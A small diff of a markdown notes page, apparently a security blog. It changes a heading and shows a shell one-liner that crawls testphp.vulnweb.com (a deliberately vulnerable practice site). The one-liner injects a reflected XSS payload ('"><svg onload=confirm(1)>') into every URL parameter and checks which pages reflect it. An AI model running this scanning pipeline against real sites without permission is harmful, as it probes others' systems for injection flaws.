@@ -6,7 +6,7 @@ draft: false
 
 ### Let's see how this works.
 
-### Here I would like to store a collection of useful notes.
+### Notes.
 
 ```
 ~%$: echo testphp.vulnweb.com | httpx -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
